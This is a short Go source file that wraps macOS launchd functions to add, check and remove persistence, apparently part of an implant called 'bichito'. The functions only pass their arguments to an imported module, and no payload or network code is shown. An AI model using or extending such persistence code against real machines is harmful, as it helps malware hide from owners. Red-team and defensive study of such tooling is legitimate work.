// +build launchd


package persistence

import (
	"bichito/modules/persistence/osx_launchd"

)

func AddPersistence(jsonPersistence string,blob string) (bool,string){

	err,result := osx_launchd.AddPersistenceLaunchd(jsonPersistence,blob)
	if err != false {
		return true,result
	}

	return false,"Persisted"
}

func CheckPersistence(jsonPersistence string) (bool,string){

	err,result := osx_launchd.CheckPersistenceLaunchd(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,result
}


func RemovePersistence(jsonPersistence string) (bool,string){

	err,result := osx_launchd.RemovePersistenceLaunchd(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,"Persistence Removed"
}